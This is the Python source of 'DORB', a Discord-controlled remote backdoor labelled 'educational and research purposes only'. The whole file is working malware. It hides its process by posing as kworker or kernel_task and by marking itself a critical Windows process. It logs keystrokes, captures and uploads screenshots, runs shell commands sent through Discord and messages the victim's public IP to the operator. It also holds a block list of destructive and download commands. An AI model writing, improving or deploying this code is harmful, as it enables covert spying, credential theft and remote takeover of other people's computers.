#!/usr/bin/env python3
"""
DORB - Discord Operational Remote Backdoor
Refactored for cross-platform compatibility (Windows, Linux, macOS)
Educational and research purposes only
"""

import discord
from discord.ext import commands
import pyautogui
import tempfile
import os
import sys
import platform
import logging
import time
import psutil
import threading
import subprocess
import shlex
import asyncio
from typing import Dict, Callable, Optional, Any
from dataclasses import dataclass
from enum import Enum
from requests import get

# Platform-specific imports
try:
    import fcntl
    HAS_FCNTL = True
except ImportError:
    HAS_FCNTL = False

try:
    import msvcrt
    HAS_MSCVRT = True
except ImportError:
    HAS_MSCVRT = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dorb.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# SECURITY SETTINGS - CONFIGURE THESE
ALLOWED_USER_ID = 1051736364766466110  # YOUR Discord ID
COMMAND_TIMEOUT = 30  # seconds
MAX_OUTPUT_LENGTH = 1900  # characters (Discord has 2000 limit)

# Dangerous command patterns to block
DANGEROUS_PATTERNS = [
    "rm -rf", "mkfs", "dd if=", ":(){", "> /dev/sda",
    "chmod 777", "chown root", "passwd", "useradd",
    "systemctl disable", "iptables -F", "ufw disable",
    "format", "diskpart", "bcdedit", "reg delete",
    "powershell Remove-Item -Recurse -Force",
    "Stop-Process -Name", "taskkill /f /im",
    "wmic process delete", "net user administrator",
    "sudo su", "sudo -i", "su -", "bash -c",
    "wget", "curl", "python -c", "perl -e",
    "echo", "cat >", ">>", "<<", "`"
]

class Platform(Enum):
    WINDOWS = "Windows"
    LINUX = "Linux"
    MACOS = "Darwin"
    UNKNOWN = "Unknown"

@dataclass
class PlatformCapabilities:
    """Stores platform-specific capabilities"""
    has_win32: bool = False
    has_x11: bool = False
    has_cocoa: bool = False
    messagebox_available: bool = False
    keylogger_available: bool = False

class ProcessManager:
    """Manages process stealth and singleton functionality"""
    
    def __init__(self):
        self.platform = platform.system()
        self.lock_file = None
        self.lock_file_path = os.path.join(tempfile.gettempdir(), 'dorb_instance.lock')
        
    def hide_from_task_manager(self):
        """Hide process from task manager (platform specific)"""
        try:
            if self.platform == "Windows":
                self._hide_windows()
            elif self.platform == "Linux":
                self._hide_linux()
            elif self.platform == "Darwin":
                self._hide_macos()
            logger.info("Process visibility reduced")
        except Exception as e:
            logger.warning(f"Could not hide from task manager: {e}")
    
    def _hide_windows(self):
        """Windows process hiding"""
        try:
            import win32gui
            import win32con
            import win32api
            
            # Hide console window
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            
            # Modify process to hide from task manager
            import ctypes
            from ctypes import wintypes
            
            # Get current process handle
            kernel32 = ctypes.windll.kernel32
            current_process = kernel32.GetCurrentProcess()
            
            # Set process to be "critical system process" (requires admin)
            try:
                ntdll = ctypes.windll.ntdll
                ntdll.RtlSetProcessIsCritical(1, 0, 0)
            except:
                pass
            
        except ImportError:
            logger.warning("Windows modules not available for hiding")
        except Exception as e:
            logger.warning(f"Windows hiding failed: {e}")
    
    def _hide_linux(self):
        """Linux process hiding"""
        try:
            # Rename process
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            
            # Change process name
            process_name = b"[kworker/0:1]"
            libc.prctl(15, process_name, 0, 0, 0)
            
            # Try to hide from ps
            os.environ["_"] = "/usr/bin/python3"
            
        except Exception as e:
            logger.warning(f"Linux hiding failed: {e}")
    
    def _hide_macos(self):
        """macOS process hiding"""
        try:
            import ctypes
            libc = ctypes.CDLL('libc.dylib')
            
            # Change process name
            process_name = b"kernel_task"
            libc.prctl(15, process_name, 0, 0, 0)
            
        except Exception as e:
            logger.warning(f"macOS hiding failed: {e}")
    
    def ensure_singleton(self) -> bool:
        """Ensure only one instance is running"""
        try:
            # Try to create lock file
            self.lock_file = open(self.lock_file_path, 'w')
            
            if self.platform == "Windows" or not HAS_FCNTL:
                # Windows or Wine fallback using msvcrt or basic file check
                return self._windows_singleton_check()
            else:
                # Unix/Linux/macOS using fcntl
                return self._unix_singleton_check()
                    
        except Exception as e:
            logger.error(f"Singleton check failed: {e}")
            return False
    
    def _windows_singleton_check(self) -> bool:
        """Windows/Wine singleton check using alternative methods"""
        try:
            # Method 1: Try msvcrt if available
            if HAS_MSCVRT:
                try:
                    msvcrt.locking(self.lock_file.fileno(), msvcrt.LK_NBLCK, 1)
                    self.lock_file.write(str(os.getpid()))
                    self.lock_file.flush()
                    return True
                except IOError:
                    self.lock_file.close()
                    return False
            
            # Method 2: Basic file existence check (less reliable but works everywhere)
            if os.path.exists(self.lock_file_path):
                try:
                    with open(self.lock_file_path, 'r') as f:
                        pid = int(f.read().strip())
                    # Check if process is still running
                    if psutil.pid_exists(pid):
                        return False
                except:
                    pass
            
            # Write our PID
            self.lock_file.write(str(os.getpid()))
            self.lock_file.flush()
            return True
            
        except Exception as e:
            logger.error(f"Windows singleton check failed: {e}")
            return False
    
    def _unix_singleton_check(self) -> bool:
        """Unix/Linux/macOS singleton check using fcntl"""
        try:
            fcntl.flock(self.lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            self.lock_file.write(str(os.getpid()))
            self.lock_file.flush()
            return True
        except IOError:
            self.lock_file.close()
            return False
    
    def cleanup(self):
        """Clean up lock file"""
        if self.lock_file:
            try:
                self.lock_file.close()
                if os.path.exists(self.lock_file_path):
                    os.unlink(self.lock_file_path)
            except:
                pass

class PlatformDetector:
    """Detects current platform and available capabilities"""
    
    def __init__(self):
        self.system = platform.system()
        self.platform = self._detect_platform()
        self.capabilities = self._detect_capabilities()
        
    def _detect_platform(self) -> Platform:
        """Detect the current platform"""
        system_map = {
            "Windows": Platform.WINDOWS,
            "Linux": Platform.LINUX,
            "Darwin": Platform.MACOS
        }
        return system_map.get(self.system, Platform.UNKNOWN)
    
    def _detect_capabilities(self) -> PlatformCapabilities:
        """Detect platform-specific capabilities"""
        caps = PlatformCapabilities()
        
        if self.platform == Platform.WINDOWS:
            try:
                import win32api
                import win32gui
                import win32console
                import ctypes
                caps.has_win32 = True
                caps.messagebox_available = True
                caps.keylogger_available = True
                logger.info('Windows mode activated - All features available')
            except ImportError as e:
                logger.warning(f"⚠️ Windows modules not available: {e}")
                
        elif self.platform == Platform.LINUX:
            # Check for X11 display
            if os.environ.get('DISPLAY'):
                caps.has_x11 = True
                caps.messagebox_available = True
                logger.info("🐧 Linux mode - X11 detected")
            else:
                logger.warning("🐧 Linux mode - No X11 display found")
                
            # Check for keylogger capabilities
            try:
                import pynput
                caps.keylogger_available = True
            except ImportError:
                logger.warning("🐧 Keylogger not available - pynput missing")
                
        elif self.platform == Platform.MACOS:
            try:
                import Cocoa
                caps.has_cocoa = True
                caps.messagebox_available = True
                logger.info("🍎 macOS mode activated")
            except ImportError:
                logger.warning("🍎 macOS modules not available")
                
        return caps

class CrossPlatformMessageBox:
    """Cross-platform messagebox implementation"""
    
    def __init__(self, capabilities: PlatformCapabilities):
        self.capabilities = capabilities
        
    def show(self, title: str, message: str, style: int = 0) -> bool:
        """Show a messagebox on the current platform"""
        try:
            if self.capabilities.has_win32:
                return self._show_windows(title, message, style)
            elif self.capabilities.has_x11:
                return self._show_linux(title, message, style)
            elif self.capabilities.has_cocoa:
                return self._show_macos(title, message, style)
            else:
                logger.warning("No messagebox implementation available for this platform")
                return False
        except Exception as e:
            logger.error(f"Messagebox failed: {e}")
            return False
    
    def _show_windows(self, title: str, message: str, style: int) -> bool:
        """Windows messagebox using ctypes"""
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, message, title, style)
        return True
    
    def _show_linux(self, title: str, message: str, style: int) -> bool:
        """Linux messagebox using zenity or kdialog"""
        import subprocess
        try:
            # Try zenity first (GNOME)
            subprocess.run(['zenity', '--info', '--title', title, '--text', message], 
                         check=True, capture_output=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            try:
                # Try kdialog (KDE)
                subprocess.run(['kdialog', '--title', title, '--msgbox', message], 
                             check=True, capture_output=True)
                return True
            except (subprocess.CalledProcessError, FileNotFoundError):
                logger.warning("No messagebox utility found (zenity/kdialog)")
                return False
    
    def _show_macos(self, title: str, message: str, style: int) -> bool:
        """macOS messagebox using osascript"""
        import subprocess
        try:
            applescript = f'display dialog "{message}" with title "{title}"'
            subprocess.run(['osascript', '-e', applescript], check=True, capture_output=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False

class KeyloggerManager:
    """Cross-platform keylogger management"""
    
    def __init__(self, capabilities: PlatformCapabilities):
        self.capabilities = capabilities
        self.is_logging = False
        self.listener = None
        self.keystrokes = []
        
    def start_logging(self) -> bool:
        """Start keylogging if available"""
        if not self.capabilities.keylogger_available:
            logger.warning("Keylogger not available on this platform")
            return False
            
        if self.is_logging:
            logger.warning("Keylogger already running")
            return False
            
        try:
            from pynput import keyboard
            
            def on_press(key):
                if key == keyboard.Key.space:
                    self.keystrokes.append(" ")
                else:
                    pass
                try:
                    self.keystrokes.append(f"{key.char}")
                except AttributeError:
                    self.keystrokes.append(f"[{key.name}]")
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            self.is_logging = True
            logger.info("Keylogger started")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start keylogger: {e}")
            return False
    
    def stop_logging(self) -> str:
        """Stop keylogging and return captured keystrokes"""
        if not self.is_logging:
            return "Keylogger not running"
            
        try:
            if self.listener:
                self.listener.stop()
            self.is_logging = False
            result = ''.join(self.keystrokes)
            self.keystrokes.clear()
            logger.info("Keylogger stopped")
            return result
        except Exception as e:
            logger.error(f"Failed to stop keylogger: {e}")
            return f"Error: {e}"
    
    def get_keystrokes(self) -> str:
        """Get current keystrokes without stopping"""
        return ''.join(self.keystrokes)

class ScreenshotManager:
    """Cross-platform screenshot management"""
    
    def __init__(self):
        self.imgur_client = None
        
    def set_imgur_credentials(self, client_id: str = None, client_secret: str = None):
        """Set Imgur credentials for uploading (optional)"""
        if not client_id or not client_secret:
            logger.warning("Imgur credentials not provided - screenshots will be saved locally")
            return
            
        try:
            from imgurpython import ImgurClient
            # Test credentials by creating client
            test_client = ImgurClient(client_id, client_secret)
            # Try to get credits to validate credentials
            test_client.get_credits()
            self.imgur_client = test_client
            logger.info("Imgur client initialized successfully")
        except ImportError:
            logger.warning("imgurpython not available - screenshots will be saved locally")
        except Exception as e:
            logger.warning(f"Invalid Imgur credentials ({e}) - screenshots will be saved locally")
            self.imgur_client = None
    
    def take_screenshot(self) -> str:
        """Take screenshot and return path or URL"""
        try:
            screenshot = pyautogui.screenshot()
            
            if self.imgur_client:
                return self._upload_to_imgur(screenshot)
            else:
                return self._save_locally(screenshot)
                
        except Exception as e:
            logger.error(f"Screenshot failed: {e}")
            return f"Error: {e}"
    
    def _upload_to_imgur(self, screenshot) -> str:
        """Upload screenshot to Imgur (Robust Version)"""
        temp_path = None  # Initialize to None
        try:
            # Step 1: Create and save the temporary file. The 'with' block ensures it's closed.
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
                temp_path = temp_file.name
                screenshot.save(temp_file)
            
            # Step 2: NOW that the file is saved and closed, upload it.
            # The file handle is no longer in use, so no sharing violation!
            uploaded = self.imgur_client.upload_from_path(temp_path, anon=True)
            return uploaded['link']
            
        except Exception as e:
            logger.error(f"Imgur upload failed: {e}")
            raise e
        finally:
            # Step 3: This block ALWAYS runs, whether the upload succeeded or failed.
            # It's the safest place to clean up the temp file.
            if temp_path and os.path.exists(temp_path):
                try:
                    os.unlink(temp_path)
                except OSError as e:
                    # Log if we can't even delete the temp file, but don't crash the app.
                    logger.error(f"Failed to delete temp file {temp_path}: {e}")
    
    def _save_locally(self, screenshot) -> str:
        """Save screenshot locally"""
        timestamp = int(time.time())
        filename = f"screenshot_{timestamp}.png"
        screenshot.save(filename)
        return f"Saved locally as {filename}"

class RemoteShellManager:
    """Cross-platform remote shell execution with safety features"""
    
    def __init__(self, platform_detector: PlatformDetector):
        self.detector = platform_detector
        
    def execute_command(self, command: str, timeout: int = COMMAND_TIMEOUT) -> str:  # NO async here!
        """Execute shell command with safety checks"""
        
        # Safety check 1: Block dangerous patterns
        for pattern in DANGEROUS_PATTERNS:
            if pattern.lower() in command.lower():
                logger.warning(f"Blocked dangerous command: {command}")
                return f"❌ Blocked: Command contains dangerous pattern '{pattern}'"
        
        # Safety check 2: Limit command length
        if len(command) > 1000:
            return "❌ Command too long (max 1000 characters)"
        
        try:
            logger.warning(f"SHELL COMMAND EXECUTED: {command}")
            
            if self.detector.platform == Platform.WINDOWS:
                # Windows command execution
                process = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore',
                    cwd=os.getcwd()
                )
            else:
                # Unix/Linux/macOS command execution
                process = subprocess.run(
                    shlex.split(command),
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore',
                    cwd=os.getcwd()
                )
            
            # Combine output and error
            output = process.stdout if process.stdout else ""
            error = process.stderr if process.stderr else ""
            
            total_output = output + ("\n" + error if error else "")
            if len(total_output) > MAX_OUTPUT_LENGTH:
                total_output = total_output[:MAX_OUTPUT_LENGTH] + "\n...[truncated]"
            
            if process.returncode != 0:
                return f"⚠️ Exit code {process.returncode}:\n```{total_output}```"
            else:
                return f"✅ Success:\n```{total_output}```"
                
        except subprocess.TimeoutExpired:
            return f"⏱️ Command timed out after {timeout} seconds"
        except FileNotFoundError:
            return "❌ Command not found or invalid"
        except PermissionError:
            return "❌ Permission denied"
        except Exception as e:
            logger.error(f"Shell execution error: {e}")
            return f"❌ Execution error: {str(e)}"
            
class CommandHandler:
    """Main command handler with clean branching"""
    
    def __init__(self, platform_detector: PlatformDetector):
        self.detector = platform_detector
        self.messagebox = CrossPlatformMessageBox(platform_detector.capabilities)
        self.keylogger = KeyloggerManager(platform_detector.capabilities)
        self.screenshot = ScreenshotManager()
        self.shell = RemoteShellManager(platform_detector)
        self.commands: Dict[str, Callable] = {}
        self._register_commands()
        
    def _register_commands(self):
        """Register all available commands"""
        self.commands = {
            'help': self.cmd_help,
            'screenshot': self.cmd_screenshot,
            'keylog': self.cmd_keylog,
            'msgbox': self.cmd_msgbox,
            'info': self.cmd_info,
            'stop': self.cmd_stop,
            'keystrokes': self.cmd_keystrokes,
            'shell': self.cmd_shell,
            'cmd': self.cmd_shell,  # Alias for shell
            'terminal': self.cmd_shell  # Another alias
        }
    
    async def handle_command(self, message: discord.Message) -> Optional[str]:
        """Handle incoming command and return response"""
        content = message.content.lower().strip()
        
        # Parse command and arguments
        parts = content.split(maxsplit=1)
        command = parts[0].lstrip('!')
        args = parts[1] if len(parts) > 1 else ""
        
        if command in self.commands:
            try:
                return await self.commands[command](args, message)
            except Exception as e:
                logger.error(f"Command '{command}' failed: {e}")
                return f"Error executing command: {e}"
        
        return None
    
    async def cmd_help(self, args: str, message: discord.Message) -> str:
        """Show available commands"""
        help_text = f"""
🔧 **DORB Commands:**
`!help` - Show this help message
`!info` - Show system information
`!screenshot` - Take and upload screenshot
`!keylog start` - Start keylogging
`!keylog stop` - Stop keylogging and get results
`!keystrokes` - Get current keystrokes (without stopping)
`!msgbox <message>` - Show messagebox on target system
`!shell <command>` - Execute system command (RESTRICTED)
`!stop` - Stop all active operations

🖥️ **Platform:** {self.detector.platform.value}
🔒 **Features:** MessageBox: {'✅' if self.detector.capabilities.messagebox_available else '❌'}, Keylogger: {'✅' if self.detector.capabilities.keylogger_available else '❌'}
⚠️ **Shell Access:** {'✅ (User ID Restricted)' if message.author.id == ALLOWED_USER_ID else '❌ (Unauthorized)'}
        """
        return help_text
    
    async def cmd_info(self, args: str, message: discord.Message) -> str:
        """Show system information"""
        info = f"""
🖥️ **System Information:**
Platform: {self.detector.platform.value}
Architecture: {platform.architecture()[0]}
Processor: {platform.processor()}
Python Version: {platform.python_version()}
Hostname: {platform.node()}
Memory: {psutil.virtual_memory().percent}% used
CPU: {psutil.cpu_percent()}% used
Current Directory: {os.getcwd()}
Shell Access: {'✅ Authorized' if message.author.id == ALLOWED_USER_ID else '❌ Restricted'}
        """
        return info
    
    async def cmd_screenshot(self, args: str, message: discord.Message) -> str:
        """Take screenshot"""
        result = self.screenshot.take_screenshot()
        return f"📸 Screenshot: {result}"
    
    async def cmd_keylog(self, args: str, message: discord.Message) -> str:
        """Handle keylogging commands"""
        if args == "start":
            if self.keylogger.start_logging():
                return "🔑 Keylogger started"
            else:
                return "❌ Failed to start keylogger"
        elif args == "stop":
            result = self.keylogger.stop_logging()
            return f"🔑 Keylogger stopped. Captured: {result}"
        else:
            return "Usage: `!keylog start` or `!keylog stop`"
    
    async def cmd_keystrokes(self, args: str, message: discord.Message) -> str:
        """Get current keystrokes"""
        keystrokes = self.keylogger.get_keystrokes()
        if keystrokes:
            return f"🔑 Current keystrokes: {keystrokes}"
        else:
            return "No keystrokes captured yet"
    
    async def cmd_msgbox(self, args: str, message: discord.Message) -> str:
        """Show messagebox"""
        if not args:
            return "Usage: `!msgbox <message>`"
        
        if self.messagebox.show("DORB", args):
            return f"✅ Message displayed: {args}"
        else:
            return "❌ Failed to display message"
    
    async def cmd_stop(self, args: str, message: discord.Message) -> str:
        """Stop all operations"""
        if self.keylogger.is_logging:
            self.keylogger.stop_logging()
        return "🛑 All operations stopped"
    
    async def cmd_shell(self, args: str, message: discord.Message) -> str:
        """Execute shell command with user restriction"""
        
        # CRITICAL SECURITY CHECK: Only allow specific user
        if message.author.id != ALLOWED_USER_ID:
            logger.warning(f"Unauthorized shell access attempt from {message.author}")
            return "❌ Unauthorized: Shell access is restricted to the bot owner only."
        
        if not args:
            return """
⚠️ **Shell Command Usage:**
`!shell <command>` - Execute a system command
`!cmd <command>` - Alias for shell
`!terminal <command>` - Alias for shell

🔒 **Safety Features:**
- User ID restricted (only you can use this)
- Dangerous commands blocked
- 30-second timeout
- Output limited to 1900 characters

📝 **Examples:**
`!shell dir` or `!shell ls` - List directory
`!shell whoami` - Show current user
`!shell ipconfig` or `!shell ifconfig` - Network info
`!shell tasklist` or `!shell ps aux` - Process list
"""
        
        # Execute the command - DON'T USE AWAIT HERE!
        # The execute_command method returns a string, not a coroutine
        return self.shell.execute_command(args)  # REMOVED: await

class DORBBot:
    """Main DORB bot class"""
    
    def __init__(self, token: str, imgur_client_id: str = None, imgur_client_secret: str = None, target_user_id: int = None):
        self.token = token
        self.target_user_id = target_user_id
        self.detector = PlatformDetector()
        self.command_handler = CommandHandler(self.detector)
        self.process_manager = ProcessManager()
        
        # Configure Discord bot
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix='!', intents=intents)
        
        # Setup Imgur if credentials provided (optional)
        self.command_handler.screenshot.set_imgur_credentials(imgur_client_id, imgur_client_secret)
        
        self._setup_events()
        
        logger.info(f"DORB initialized on {self.detector.platform.value}")
        logger.info(f"Capabilities: {self.detector.capabilities}")
        logger.info(f"Shell access restricted to user ID: {ALLOWED_USER_ID}")
    
    def _setup_events(self):
        """Setup Discord event handlers"""
        
        @self.bot.event
        async def on_ready():
            logger.info(f'Bot logged in as {self.bot.user}')
            logger.info(f'Bot ID: {self.bot.user.id}')
            
            # Send startup message to target user
            if self.target_user_id:
                try:
                    target_user = await self.bot.fetch_user(self.target_user_id)
                    ip = get('https://api.ipify.org').content.decode('utf8')

                    if target_user:
                        print('My public IP address is: {}'.format(ip))

                        await target_user.send('public IP address is: {}'.format(ip))
                        logger.info(f"Startup message sent to user {self.target_user_id}")
                    else:
                        logger.warning(f"Could not find user with ID {self.target_user_id}")
                except discord.Forbidden:
                    logger.warning(f"Cannot send message to user {self.target_user_id} - permissions denied")
                except discord.HTTPException as e:
                    logger.error(f"Failed to send startup message: {e}")
                except Exception as e:
                    logger.error(f"Unexpected error sending startup message: {e}")
        
        @self.bot.event
        async def on_message(message):
            # Ignore bot's own messages
            if message.author == self.bot.user:
                return
            
            # Handle commands
            response = await self.command_handler.handle_command(message)
            if response:
                await message.channel.send(response)
    
    def run(self):
        """Start the bot"""
        try:
            self.bot.run(self.token)
        except Exception as e:
            logger.error(f"Bot failed to start: {e}")
            sys.exit(1)

def main():
    """Main entry point"""
    # Configuration - Replace with your actual credentials
    
    # Discord Bot Token (REQUIRED)
    DISCORD_TOKEN = "[Your_Discord_Token]"
    
    # Target User ID for startup message
    TARGET_USER_ID = 1051736364766466110 # Change this to your account for communicating with the command line
    
    # Imgur API Credentials (OPTIONAL - for screenshot uploads)
    # Get your credentials from: https://api.imgur.com/oauth2/addclient
    # Leave as None to save screenshots locally instead
    IMGUR_CLIENT_ID = "[Your_Client_ID]"  # e.g., "your_imgur_client_id"
    IMGUR_CLIENT_SECRET = "[Your_client_secret]"  # e.g., "your_imgur_client_secret"
    
    # Initialize process manager
    process_manager = ProcessManager()
    
    # Check for existing instance
    if not process_manager.ensure_singleton():
        logger.error("Another instance is already running. Exiting...")
        sys.exit(1)
    
    try:
        # Hide from task manager
        process_manager.hide_from_task_manager()
        
        # Create and run bot
        bot = DORBBot(
            token=DISCORD_TOKEN,
            imgur_client_id=IMGUR_CLIENT_ID,
            imgur_client_secret=IMGUR_CLIENT_SECRET,
            target_user_id=TARGET_USER_ID
        )
        bot.run()
        
    except KeyboardInterrupt:
        logger.info("Shutting down...")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
    finally:
        # Cleanup
        process_manager.cleanup()
        sys.exit(0)

if __name__ == "__main__":
    main()
